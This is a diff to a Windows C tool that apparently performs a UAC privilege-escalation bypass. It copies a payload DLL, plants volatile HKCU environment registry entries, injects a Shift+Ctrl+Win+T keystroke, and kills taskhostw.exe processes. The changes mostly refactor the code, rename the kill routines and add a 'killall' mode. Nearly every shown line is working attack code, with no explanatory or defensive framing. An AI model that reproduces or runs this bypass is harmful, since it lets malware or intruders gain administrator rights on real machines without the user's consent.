@@ -14,10 +14,10 @@
 
 #define WAITFORTASK 2500
 
-#define CreateEnvEntryFunction CreateEnvEntry2
-#define DeleteEnvEntryFunction DeleteEnvEntry2
+#define CreateEnvEntryFunction CreateEnvEntry
+#define DeleteEnvEntryFunction DeleteEnvEntry
 
-HANDLE GetProcessTokenByPID(DWORD pid)
+static HANDLE GetProcessTokenByPID(DWORD pid)
 {
 	HANDLE process = NULL;
 	HANDLE token = NULL;
@@ -30,7 +30,7 @@ HANDLE GetProcessTokenByPID(DWORD pid)
 	return token;
 }
 
-BOOL IsElevated(DWORD pid)
+static BOOL IsElevated(DWORD pid)
 {
 	BOOL ret = FALSE;
 	DWORD retlen = 0;
@@ -51,9 +51,9 @@ BOOL IsElevated(DWORD pid)
 	return ret;
 }
 
-typedef BOOL(*LPELEVATED_TASKHOST_CALLBACK)(DWORD pid, void* parameter);
+typedef BOOL(*LPTASKHOST_ENUM_CALLBACK)(DWORD pid, void* parameter);
 
-BOOL FindElevatedTaskHostProcesses(LPELEVATED_TASKHOST_CALLBACK callback, void* parameter)
+static BOOL FindTaskHostProcesses(LPTASKHOST_ENUM_CALLBACK callback, void* parameter)
 {
 	HANDLE process = NULL;
 	PROCESSENTRY32W pe32;
@@ -75,13 +75,10 @@ BOOL FindElevatedTaskHostProcesses(LPELEVATED_TASKHOST_CALLBACK callback, void* 
 			{
 				if (!lstrcmpiW(L"taskhostw.exe", pe32.szExeFile))
 				{
-					if (IsElevated(pe32.th32ProcessID))
+					ret = callback(pe32.th32ProcessID, parameter);
+					if (!ret)
 					{
-						ret = callback(pe32.th32ProcessID, parameter);
-						if (!ret)
-						{
-							break;
-						}
+						break;
 					}
 				}
 			} while (Process32NextW(snapshot, &pe32));
@@ -91,9 +88,16 @@ BOOL FindElevatedTaskHostProcesses(LPELEVATED_TASKHOST_CALLBACK callback, void* 
 	return ret;
 }
 
-BOOL TerminateElevatedProcess(DWORD pid, void* parameter)
+static BOOL TerminateTaskhostW(DWORD pid, void* parameter)
 {
 	HANDLE process = NULL;
+	if (!parameter)
+	{
+		if (!IsElevated(pid))
+		{
+			return TRUE;
+		}
+	}
 	printf("PID %u found!\n", (unsigned int)pid);
 	process = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
 	if (process)
@@ -108,7 +112,7 @@ BOOL TerminateElevatedProcess(DWORD pid, void* parameter)
 	return TRUE;
 }
 
-BOOL CopyPayloadDLL(char* dllfile, char* basepath)
+static BOOL CopyPayloadDLL(char* dllfile, char* basepath)
 {
 	char dllpath[MAX_PATH];
 	int dir_len = 0;
@@ -133,7 +137,7 @@ BOOL CopyPayloadDLL(char* dllfile, char* basepath)
 	return TRUE;
 }
 
-BOOL DeletePayloadDLL(char* basepath)
+static BOOL DeletePayloadDLL(char* basepath)
 {
 	char dllpath[MAX_PATH];
 	int dir_len = 0;
@@ -154,7 +158,7 @@ BOOL DeletePayloadDLL(char* basepath)
 	return TRUE;
 }
 
-BOOL CreateEnvEntry(char* basepath)
+static BOOL CreateEnvEntry(char* basepath)
 {
 	HKEY key = NULL;
 
@@ -172,7 +176,7 @@ BOOL CreateEnvEntry(char* basepath)
 	return TRUE;
 }
 
-BOOL DeleteEnvEntry()
+static BOOL DeleteEnvEntry()
 {
 	HKEY key = NULL;
 
@@ -186,47 +190,15 @@ BOOL DeleteEnvEntry()
 	return TRUE;
 }
 
-BOOL CreateEnvEntry2(char* basepath)
-{
-	HKEY key = NULL;
-
-	if (RegCreateKeyExA(HKEY_CURRENT_USER, ENVREGKEY2, 0, NULL, REG_OPTION_VOLATILE, KEY_SET_VALUE, NULL, &key, NULL))
-	{
-		return FALSE;
-	}
-	if (RegSetValueExA(key, ENVREGVALUE, 0, REG_SZ, basepath, lstrlenA(basepath) + 1))
-	{
-		RegCloseKey(key);
-		return FALSE;
-	}
-	RegCloseKey(key);
-
-	return TRUE;
-}
-
-BOOL DeleteEnvEntry2()
-{
-	HKEY key = NULL;
-
-	if (RegOpenKeyExA(HKEY_CURRENT_USER, ENVREGKEY, 0, KEY_READ, &key))
-	{
-		return FALSE;
-	}
-	RegDeleteKeyA(key, "0");
-	RegCloseKey(key);
-
-	return TRUE;
-}
-
-void Cleanup(char* basepath)
+static void Cleanup(char* basepath)
 {
 	DeleteEnvEntryFunction();
 	DeletePayloadDLL(basepath);
 }
 
-BOOL PressShiftCtrlWinT()
+static BOOL PressShiftCtrlWinT()
 {
-	INPUT inputs[8];
+	INPUT inputs[8] = { 0 };
 	memset(&inputs[0], 0, sizeof(inputs));
 
 	inputs[0].type = INPUT_KEYBOARD;
@@ -260,9 +232,9 @@ BOOL PressShiftCtrlWinT()
 	return (SendInput(8, &inputs[0], sizeof(INPUT)) > 0);
 }
 
-void print_help(char* executable)
+static void print_help(char* executable)
 {
-	printf("Usage: %s [bypass|cleanup|kill] [dll path]\n", executable);
+	printf("Usage: %s [bypass|cleanup|killelev|killall] [dll path]\n", executable);
 }
 
 int main(int argc, char** argv)
@@ -284,9 +256,14 @@ int main(int argc, char** argv)
 		Cleanup(tmppath);
 		return 0;
 	}
-	if (!lstrcmpiA(argv[1], "kill"))
+	if (!lstrcmpiA(argv[1], "killelev"))
 	{
-		FindElevatedTaskHostProcesses((LPELEVATED_TASKHOST_CALLBACK)TerminateElevatedProcess, NULL);
+		FindTaskHostProcesses((LPTASKHOST_ENUM_CALLBACK)TerminateTaskhostW, NULL);
+		return 0;
+	}
+	if (!lstrcmpiA(argv[1], "killall"))
+	{
+		FindTaskHostProcesses((LPTASKHOST_ENUM_CALLBACK)TerminateTaskhostW, (void*)TRUE);
 		return 0;
 	}
 	if (lstrcmpiA(argv[1], "bypass"))
